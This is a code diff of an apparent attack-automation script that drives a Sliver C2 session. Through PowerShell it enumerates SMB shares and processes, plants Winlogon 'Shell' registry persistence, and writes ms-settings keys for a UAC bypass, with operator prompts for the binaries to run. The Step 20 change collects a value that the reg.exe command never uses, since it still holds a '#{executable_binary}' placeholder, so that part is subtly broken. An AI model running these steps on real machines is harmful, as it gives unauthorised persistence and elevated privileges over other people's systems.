@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -64,18 +64,10 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
     confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
-    confirm_action()
-    commands = """
+    commands = rf"""
     get-smbshare
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -104,8 +96,9 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
+    commands = rf"""
     Get-Process
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -196,8 +189,20 @@ async def main():
     confirm_action()
 
     confirm_action()
-    commands = """
-    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 17 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: binary_to_execute[/]")
+    console.print(f"  Description: Path of binary to execute")
+    default_val = "C:\Windows\System32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for binary_to_execute [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: binary_to_execute")
+    user_params["binary_to_execute"] = user_input
+    commands = rf"""
+    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, {user_params["binary_to_execute"]}" -Force
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -205,6 +210,17 @@ async def main():
 
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 20 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
+    console.print(f"  Description: Binary to execute with UAC Bypass")
+    default_val = "C:\Windows\System32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: executable_binary")
+    user_params["executable_binary"] = user_input
     commands = """
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
